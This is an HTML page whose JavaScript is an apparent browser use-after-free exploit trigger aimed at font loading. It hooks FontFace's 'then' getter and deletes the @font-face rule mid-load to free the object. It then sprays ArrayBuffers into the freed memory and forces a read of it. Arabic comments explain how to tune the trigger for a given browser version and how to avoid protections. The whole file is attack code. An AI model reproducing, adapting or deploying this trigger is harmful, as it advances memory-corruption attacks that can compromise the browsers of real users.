<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }
</style>
</head>
<body style="background: black;">

<script>
window.onload = () => {
    let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    let callbackCount = 0;
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            // تفقد الخاصية للتأكد من أن الاستدعاء يخص كائننا المستهدف
            if (this === A) {
                callbackCount++;
                
                // ننتظر حتى يتم استدعاء setStatus عدة مرات لاستقرار المؤشر في الذاكرة
                // ضبط هذا الرقم (مثلاً 1 أو 2 أو 3) هو مفتاح حل الثغرة في إصدارك
                if (callbackCount === 2) { 
                    
                    // تحرير الكائن (Use-After-Free)
                    document.getElementById('s').sheet.deleteRule(0);
                    
                    // محاولة ملء الفراغ بكائنات خفيفة فوراً دون إثارة الحماية
                    let holder = [];
                    for (let i = 0; i < 10; i++) {
                        holder.push(new ArrayBuffer(0x200)); 
                    }
                    
                    // إجبار المحرك على قراءة الذاكرة المستبدلة
                    document.body.offsetTop;
                    
                    // إذا وصلنا هنا واستقر المتصفح، ستتحول الشاشة للون الأخضر!
                    document.body.style.background = "green";
                }
            }
            return undefined;
        }
    });

    // إطلاق عملية الضخ (Pump)
    document.fonts.load('1em targetFont', 'AB');
};
</script>
</body>
</html>
